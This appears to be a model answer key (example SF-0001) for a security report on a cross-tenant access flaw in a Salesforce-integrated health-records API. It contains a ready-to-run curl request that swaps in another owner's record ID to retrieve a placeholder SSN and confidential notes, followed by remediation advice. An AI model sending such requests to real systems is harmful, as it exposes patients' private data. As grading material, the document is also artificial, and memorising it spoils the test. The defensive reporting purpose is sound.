# Expected Response

## System
- **Domain:** Healthcare / EHR Platform (Salesforce-Integrated)
- **System:** PatientCore EHR API (Salesforce-Integrated)
- **Example ID:** SF-0001

## Priority Findings

### Finding 1: Healthcare EHR Salesforce — BOLA via Aura Controller getQuoteDetails Exposes Cross-Tenant Patient Quote Records (Pattern 1.5)
**Severity:** Critical
**Category:** BOLA / Multi-Tenant / Cross-Tenant Access (Salesforce Aura)

**Summary:**
Per §4.0 (RISK-SF-001/RISK-SF-002): The `QuoteController` Apex class is declared `without sharing`, meaning Salesforce sharing rules are not enforced. The SOQL query is missing an ownership check (`AND OwnerId = UserInfo.getUserId()`). Per §5.0 (Pattern 1.5 — multi-tenant/cross-tenant access): an attacker with a valid Salesforce session can substitute any `quoteId` value in the Aura action request to retrieve patient quote records belonging to other users/tenants. An attacker submitted `c.QuoteController.getQuoteDetails` with `quoteId: "001E8E7"` (belonging to `OwnerId: "005VICTIM"`) and received `SensitiveData__c: "SSN: 000-28-7184"` and `InternalNotes__c: "CONFIDENTIAL: internal review notes"`. In Healthcare EHR, exposure of patient SSNs and clinical notes constitutes a HIPAA/PHI breach.

**Evidence from HAR:**
- Request: `POST https://a389e8e7.lightning.force.com/aura`
- Aura action descriptor: `c.QuoteController.getQuoteDetails`
- `aura.token`: `undefined` (indicates misconfigured/unauthenticated token)
- Params: `quoteId: "001E8E7"`, `fields: ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]`
- Response `SUCCESS`: `Id: "001E8E7"`, `Name: "Victim Quote Record"`, `OwnerId: "005VICTIM"`, `InternalNotes__c: "CONFIDENTIAL: internal review notes"`, `SensitiveData__c: "SSN: 000-28-7184"`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-SF-001 | Controller declared `without sharing` — no sharing rules enforced |
| context.txt §4.0 | RISK-SF-002 | SOQL missing `AND OwnerId = UserInfo.getUserId()` |
| context.txt §5.0 | Pattern 1.5 | Multi-tenant cross-tenant access via quoteId substitution |
| HAR request | params.quoteId | 001E8E7 — arbitrary victim record ID |
| HAR response | SensitiveData__c | SSN: 000-28-7184 (PHI) |
| HAR response | InternalNotes__c | CONFIDENTIAL: internal review notes |
| HAR response | OwnerId | 005VICTIM (cross-ownership confirmed) |

## Steps to Reproduce

### Step 1 — Aura quoteId substitution to retrieve cross-tenant PHI (HAR)
```bash
curl -s -X POST 'https://a389e8e7.lightning.force.com/aura' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.QuoteController.getQuoteDetails","callingDescriptor":"UNKNOWN","params":{"quoteId":"001E8E7","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
```
**Vulnerable:** Returns victim patient quote record including `SSN: 000-28-7184`. **Secure:** FORBIDDEN — `with sharing` enforced; SOQL restricted to `OwnerId = UserInfo.getUserId()`.

## Remediation
1. Declare `QuoteController` as `with sharing` to enforce Salesforce object-level and record-level security.
2. Add `AND OwnerId = :UserInfo.getUserId()` (or CRUD/FLS check) to the SOQL WHERE clause.
3. Validate `aura.token` is a valid, unexpired session token before processing any Aura action.
4. Restrict `fields` parameter — never allow client-supplied field lists; define allowed fields server-side.
